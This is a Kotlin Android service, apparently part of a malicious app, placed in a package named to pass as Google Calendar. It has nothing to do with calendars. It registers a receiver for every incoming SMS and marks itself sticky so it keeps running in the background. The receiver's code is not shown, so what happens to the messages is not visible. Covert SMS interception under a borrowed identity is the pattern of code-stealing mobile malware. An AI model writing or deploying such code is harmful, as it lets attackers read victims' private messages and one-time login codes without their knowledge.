package com.google.calendar.android

import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder

class SmsListenerService : Service() {

    companion object {
        var runnn = false
    }
    private lateinit var smsReceiver: SmsReceiver

    override fun onCreate() {
        super.onCreate()

        smsReceiver = SmsReceiver()
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        registerReceiver(smsReceiver, filter)
        runnn = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
        runnn = false
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}